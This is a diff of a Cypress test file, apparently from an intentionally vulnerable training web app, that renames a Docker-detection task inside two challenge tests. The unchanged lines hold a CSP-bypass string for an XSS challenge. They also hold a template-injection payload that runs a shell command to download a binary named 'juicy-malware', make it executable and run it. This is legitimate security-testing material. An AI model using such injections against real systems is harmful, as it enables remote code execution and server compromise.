@@ -17,8 +17,8 @@ describe('/profile', () => {
 
   describe('challenge "usernameXss"', () => {
     it('Username field should be susceptible to XSS attacks after disarming CSP via profile image URL', () => {
-      cy.task('disableOnContainerEnv').then((disableOnContainerEnv) => {
-        if (!disableOnContainerEnv) {
+      cy.task('isDocker').then((isDocker) => {
+        if (!isDocker) {
           cy.visit('/profile')
           cy.get('#url').type(
             "https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com"
@@ -48,8 +48,8 @@ describe('/profile', () => {
 
   describe('challenge "ssti"', () => {
     it('should be possible to inject arbitrary nodeJs commands in username', () => {
-      cy.task('disableOnContainerEnv').then((disableOnContainerEnv) => {
-        if (!disableOnContainerEnv) {
+      cy.task('isDocker').then((isDocker) => {
+        if (!isDocker) {
           cy.visit('/profile')
           cy.get('#username').type(
             "#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}",
